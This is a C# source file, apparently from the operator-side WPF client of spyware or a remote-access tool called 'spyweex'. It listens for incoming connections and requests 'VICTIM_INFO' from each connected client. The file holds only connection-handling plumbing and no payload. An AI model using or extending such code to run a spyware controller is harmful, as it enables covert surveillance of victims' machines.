using System;
using System.Diagnostics;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using spyweex_client_wpf.StaticStrings;

namespace spyweex_client_wpf.Subscribers
{
    public class ConnectionListener : ISubscriber
    {
        public void Subscribe(ConnectionInfoListener cil, ViewModel viewModel, WxhtpServiceServer server)
        {
            if (isSubscribed) return;
            isSubscribed = true;

            IDisposable idisp = server.getObservableSequenceOfConnections().
            ObserveOn(Scheduler.CurrentThread).
            Subscribe(
                async ipEndPointString =>
                {
                    CancellationTokenSource cts = new CancellationTokenSource();
                    CancellationToken ct;
                    ct = cts.Token;
                    WxhtpClient cl = server.TryGetClientByIpEndpoint(Utils.ParseIPEndpoint(ipEndPointString));
                    await cl.ExecuteTask(ct,
                        cl.getTcpClient().Client.RemoteEndPoint.ToString(),
                        METHOD_TYPE.GET,
                        ACTION_TYPE.VICTIM_INFO);
                    cil.Subscribe(viewModel, cl);

                    //cil.UnsubscribeByTimeOut(TimeSpan.FromSeconds(5)); // To prevent blocking if no info obtained                    
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in SessionListener" + (Exception)err);
                }
            );

            subscriberToken = idisp;
        }



    }

}